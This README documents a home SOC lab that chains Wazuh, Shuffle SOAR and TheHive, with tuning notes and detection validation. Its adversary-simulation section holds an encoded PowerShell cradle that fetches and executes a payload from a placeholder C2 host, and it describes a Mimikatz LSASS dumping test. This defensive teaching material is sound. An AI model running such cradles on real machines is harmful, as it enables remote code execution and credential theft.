# Unified SOC Automation & Incident Response Lab

## Project Overview
This project details the architectural design, deployment, and optimization of an enterprise-grade Security Operations Center (SOC) sandbox environment. Built entirely within a virtualized infrastructure, the objective of this lab is to establish an end-to-end telemetry pipeline: capturing high-fidelity endpoint events, parsing them through a centralized Security Information and Event Management (SIEM) system, orchestrating alerts via a SOAR platform, and managing incident lifecycles within an automated Case Management system.

A primary engineering milestone of this project was the **optimization and custom resource constraint tuning** of heavy Java-based enterprise platforms (Elasticsearch, Cassandra, OpenSearch) to seamlessly co-exist and function smoothly on a single, resource-restricted virtualization workstation without degrading stability or causing kernel-level resource starvation.

---

## Architectural Topology & Cross-Component Integration
The power of this lab lies in the precise communication logic binding individual isolated components into a unified defense architecture.

```
[Windows 10 Client] (10.0.2.15)
│
▼ (Encrypted Log Transport - TCP 1514)
[Wazuh Server] (10.0.2.4)
│
▼ (JSON Webhook Integration via ossec.conf - TCP 4445)
[Shuffle SOAR Server] (10.0.2.6)
│
▼ (Rest API Integration via Authorization Headers - TCP 9000)
[TheHive Server] (10.0.2.3)
```

### 1. Ingestion Link (Endpoint ➡️ Wazuh)
The Windows 10 Endpoint runs the lightweight `Wazuh-Agent` service background process. The agent uses an encrypted communication channel on port **TCP 1514** targeting the Wazuh Manager's internal NAT IP (`10.0.2.4`). High-fidelity event streams collected via Sysmon are continually structured into log frames and sent across this layer.

### 2. Orchestration Link (Wazuh ➡️ Shuffle SOAR)
When a detection rule match triggers an alert, the Wazuh Manager passes the raw event metadata down to an internal daemon responsible for external processing. This link is established by appending a custom integration block inside the Wazuh Manager's core `/var/ossec/etc/ossec.conf` file:

```xml
<ossec_config>
  <integration>
    <name>custom-shuffle</name>
    <hook_url>https://10.0.2.6:3443/api/v1/hooks/webhook_shuffle_uuid</hook_url>
    <level>10</level>
    <alert_format>json</alert_format>
  </integration>
</ossec_config>
```

* `hook_url`: Points explicitly to the custom Webhook container interface exposed inside the Shuffle platform instance on port `3443`.
* `level`: Filters out environmental noise by ensuring only critical, actionable events (Severity Tier level 10 and above) execute a post action to the automation pipeline.

### 3. Case Engineering Link (Shuffle SOAR ➡️ TheHive)
Once Shuffle processes and enriches the incoming JSON webhook structure, it converts variables into an organized operational schema. It completes the automated pipeline by execution of an outbound programmatic HTTP POST API call to TheHive server instance on port **TCP 9000**:

* **Target Endpoint URL:** `http://10.0.2.3:9000/api/case`
* **Authentication Vector:** A custom request header containing an administrative API bearer token unique to Shuffle (`Authorization: Bearer <TheHive_Generated_API_Key>`).
* **JSON Data Structure Payload:** Passes vital detection parameters (`title`, `description`, `severity`, `tlp`, `tags`, and targeted observable artifacts like `malicious_IP` or `process_hash`).

---

## Network Architecture & Port Forwarding Blueprint
To facilitate administration, development, and dashboard access from the physical host machine while keeping the core infrastructure isolated inside a VirtualBox custom NAT Network (`10.0.2.0/24`), explicit Layer 4 port forwarding rule sets were engineered. Traffic hitting the physical host loopback interface (`127.0.0.1`) is programmatically translated and routed to the corresponding internal guest nodes as follows:

| Service Target | Protocol | Host Inbound IP | Host Port | Target Guest IP | Target Guest Port | Purpose |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Wazuh Dashboard** | TCP | `127.0.0.1` | `4444` | `10.0.2.4` | `443` | Secure HTTPS Web Console Access |
| **Wazuh SSH** | TCP | `127.0.0.1` | `2222` | `10.0.2.4` | `22` | Remote Terminal Management |
| **TheHive Webview** | TCP | `127.0.0.1` | `9000` | `10.0.2.3` | `9000` | Frontend Case Management Access |
| **TheHive SSH** | TCP | `127.0.0.1` | `2223` | `10.0.2.3` | `22` | Remote Terminal Management |
| **Shuffle Dashboard** | TCP | `127.0.0.1` | `4445` | `10.0.2.6` | `3443` | Secure Automation Workflow Engine |
| **Shuffle SSH** | TCP | `127.0.0.1` | `2224` | `10.0.2.6` | `22` | Remote Terminal Management |

---

## Technology Stack & Credits
* **Hypervisor:** Oracle VirtualBox
* **Endpoint Telemetry:** Microsoft Windows 10 Pro + SwiftOnSecurity Sysmon Configuration
  * *Credit:* Advanced endpoint auditing utilizes the community-vetted, production-hardened `sysmonconfig.xml` framework maintained by [SwiftOnSecurity GitHub Repository](https://github.com/SwiftOnSecurity/sysmonconfig).
* **SIEM Platform:** [Wazuh SIEM](https://wazuh.com/) (Manager, Indexer utilizing OpenSearch, Dashboard)
* **SOAR Platform:** [Shuffle](https://shuffler.io/) (Docker-Compose Containerized Architecture)
* **Incident Management:** [TheHive](https://thehive-project.org/) (Backed by Apache Cassandra & Elasticsearch clusters)

---

## Memory Optimization & Resource Engineering
Deploying enterprise application stacks on a localized, single-workstation environment presents significant memory constraints. By default, production-grade databases scale aggressively, which can lead to host starvation and kernel-level Linux Out-of-Memory (OOM) actions.

The following architectural modifications and "diets" were engineered into the environment to maintain operational stability.

### 1. Virtual Memory & Emergency Swap Overlays
To protect virtual machines from unexpected log ingestion spikes or simultaneous service startup execution bottlenecks ("boot storms"), a strict virtual memory overlay strategy was implemented across the infrastructure nodes (TheHive, Wazuh, Shuffle Server):

```bash
# Provisioning a 4GB virtual swap allocation on local storage blocks
sudo fallocate -l 4G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile

# Persisting the swap configuration across machine power states
echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
```

### 2. Tuning Linux Kernel Memory Map Allocation
The backend search indexers (Elasticsearch and OpenSearch) require deep virtual memory mapping capabilities. To prevent crashes while keeping physical RAM allocations to a strict minimum, kernel parameters were modified:

```bash
# Adjusting system limits to accommodate heavy virtual memory indexing demands
sudo sysctl -w vm.max_map_count=262144
echo "vm.max_map_count=262144" | sudo tee -a /etc/sysctl.conf

# Decreasing aggressiveness of memory swapping to optimize physical cache behavior
sudo sysctl -w vm.swappiness=10
echo "vm.swappiness=10" | sudo tee -a /etc/sysctl.conf
```

### 3. Java Virtual Machine (JVM) Heap Resizing & Restraints
By default, Cassandra, Elasticsearch, and OpenSearch run with massive default memory heap limits. These configurations were modified down to a strict **1 Gigabyte** ceiling per cluster node.

#### Apache Cassandra Configuration (`/etc/cassandra/cassandra-env.sh` or overrides)

```text
# Constraining heap footprints to mitigate Java Garbage Collection overhead
-Xms1G
-Xmx1G
```

#### Elasticsearch & OpenSearch Configs (`jvm.options` / `docker-compose.yml`)

For containerized elements like Shuffle's embedded analytics layer or Wazuh's local engine, environment flags and runtime files were explicitly locked down:

```yaml
environment:
  - OPENSEARCH_JAVA_OPTS="-Xms1g -Xmx1g"
  - "discovery.type=single-node"
  - "bootstrap.memory_lock=true"
```

### 4. CPU Execution Constraints
To safeguard host workstation stability, hypervisor settings were modified to throttle maximum computational thresholds during peak processing times:

* **Execution Cap:** Configured a hard `90%` execution ceiling per virtualized processor core. This ensures a guaranteed `10%` host computing buffer, eliminating the risk of host operating system lockups.

---

## Step-by-Step Deployment Walkthrough

### Phase 1: Local Endpoint Instrumentation

1. Provision a Windows 10 Pro virtual machine on the custom NAT Network.
2. Download and deploy Sysmon using the credited SwiftOnSecurity schema to map high-fidelity indicators (Process Creation, Network Connections, Registry alterations) via an administrative PowerShell terminal:

```powershell
.\Sysmon64.exe -i .\sysmonconfig.xml
```

### Phase 2: SIEM Server Engineering & Agent Enrollment

1. Instantiate an Ubuntu Linux instance dedicated to the Wazuh Server stack.
2. Apply the **Wazuh-Indexer RAM diet** via `/etc/wazuh-indexer/jvm.options` to cap memory usage. Implement the Swap files and `sysctl` modifications before running the engine setup.
3. Access the dashboard via `https://127.0.0.1:4444`. Navigate to **Agents** → **Deploy new agent**. Generate the explicit PowerShell installer script.
4. Run the installer loop on the Windows client and add the raw Sysmon target telemetry channel configuration block into the client's `C:\Program Files (x86)\ossec-agent\ossec.conf` document:

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

5. Restart the client channel courier via PowerShell: `Restart-Service -Name WazuhSvc`.

### Phase 3: Case Management Orchestration

1. Instantiate the dedicated Ubuntu Server node for TheHive.
2. Navigate immediately to `/etc/cassandra/cassandra-env.sh` and drop `MAX_HEAP_SIZE="1G"` and `HEAP_NEWSIZE="256M"` overrides into place to shield the app from out-of-memory kernel termination flags.
3. Configure `/etc/elasticsearch/jvm.options` parameters to mirror the 1G restrictions.
4. Run the startup dependencies sequentially (`cassandra` ➡️ `elasticsearch` ➡️ `thehive`) and map API integration hooks.

### Phase 4: SOAR Deployment & Automation Engine

1. Launch the Shuffle SOAR machine node. Install dependencies via `apt install docker.io docker-compose git -y`.
2. Clone the development tree (`git clone https://github.com/Shuffle/Shuffle`).
3. Intercept the `docker-compose.yml` properties and explicitly drop the `- OPENSEARCH_JAVA_OPTS="-Xms1g -Xmx1g"` flag into the OpenSearch variable matrix.
4. Fire up the docker infrastructure via `sudo docker-compose up -d` and map the incoming webhooks from Wazuh alerts straight into automated response processing tracks.

---

## Adversary Simulation & Validation
To test the security monitoring, detection, automation, and alerting capability of our pipeline, multi-staged adversary attack scripts were simulated on the Windows 10 victim node.

### Execution Target 1: Credential Dumping via Mimikatz
To simulate credential harvesting and LSASS memory access anomalies, a localized Mimikatz testing sequence was launched:

1. Open an Administrative PowerShell terminal on the Windows 10 node.
2. Execute a simulated pull or run of a Mimikatz binary or memory dump variant designed to trigger read requests against `lsass.exe`.
3. **Telemetry Reaction:** Sysmon instantly generates a critical **Event ID 10 (ProcessAccess)** showing an abnormal access request targeting LSASS from an untrusted binary, along with **Event ID 1 (Process Creation)** signatures.

**MITRE ATT&CK Mapping**
- Tactic: Credential Access (TA0006)
- Technique: OS Credential Dumping — LSASS Memory (T1003.001)
- Detection: Sysmon Event ID 10 (ProcessAccess targeting lsass.exe)

**Splunk Detection Query**
```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=10 TargetImage="*lsass.exe"
(GrantedAccess=0x1010 OR GrantedAccess=0x1038 OR GrantedAccess=0x143A)
| table _time, SourceImage, TargetImage, GrantedAccess, CallTrace
```
*Key: GrantedAccess 0x1010 = PROCESS_VM_READ — legitimate processes rarely require this against LSASS*

### Execution Target 2: Malicious PowerShell Stager Payload
To simulate initial access payloads or command-and-control (C2) persistence tradecraft, an obfuscated Base64 stager connection was triggered:

1. Run a network-cradled download loop from the victim machine terminal:

```powershell
powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLWNvbW1hbmQtYW5kLWNvbnRyb2wubG9jYWwvcGF5bG9hZCcp
```

2. **Telemetry Reaction:** Sysmon generates **Event ID 1** tracking the hidden executable parameters and **Event ID 3 (Network Connection)** mapping the dynamic socket drop to an outbound IP segment.

**MITRE ATT&CK Mapping**
- Tactic: Execution (TA0002), Defense Evasion (TA0005)
- Technique: Command and Scripting Interpreter — PowerShell (T1059.001), Obfuscated Files or Information (T1027)
- Detection: Sysmon Event ID 1 (encoded command parameter), Event ID 3 (outbound C2 connection)

**Splunk Detection Query**
```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1 Image="*powershell.exe"
(CommandLine="* -EncodedCommand *" OR CommandLine="* -enc *")
| table _time, ParentImage, Image, CommandLine, User
```
*High-fidelity variant: filter ParentImage for Office applications (WINWORD.exe, EXCEL.exe, 
outlook.exe) — PowerShell spawned from Office is near-certain phishing/macro execution.*

## Verification Lifecycle Proof
The execution of the attacks successfully validates the structural engineering of the SOC data stream pipeline across every node layer:

* **Detection Validation:** Wazuh consumes the high-fidelity Event Channel telemetry logs and successfully cross-matches signature criteria against pre-built rulesets, generating Tier-1 alerts on the indexer dashboard.
* **Orchestration Validation:** The Wazuh Manager issues a secure Webhook out to Shuffle SOAR containing the raw JSON document structure of the active alert.
* **Case Generation Validation:** Shuffle intercepts the payload data, strips out environmental white-noise parameters, executes automated alert enrichment steps, and runs a programmatic POST request out to TheHive API, successfully publishing an active incident response investigation ticket.
---

## References & Acknowledgements
Building a comprehensive SOC from scratch requires standing on the shoulders of the cybersecurity community. This infrastructure and deployment methodology was heavily inspired by the following educational resources:

* **[MYDFIR]**: The core architectural inspiration and deployment sequence for integrating Wazuh, TheHive, and Shuffle was guided by their exceptional SOC analyst home lab series. [View the YouTube Playlist Here](https://youtu.be/ahrSFdiWzis?si=w8iXCjyjIPOU-0U6)
* **SwiftOnSecurity**: The endpoint telemetry generation utilizes their community-vetted `sysmonconfig.xml` framework. [View the Repository Here](https://github.com/SwiftOnSecurity/sysmonconfig)
* **Wazuh, TheHive, & Shuffle Documentation**: For granular API integration and memory-tuning configuration steps.
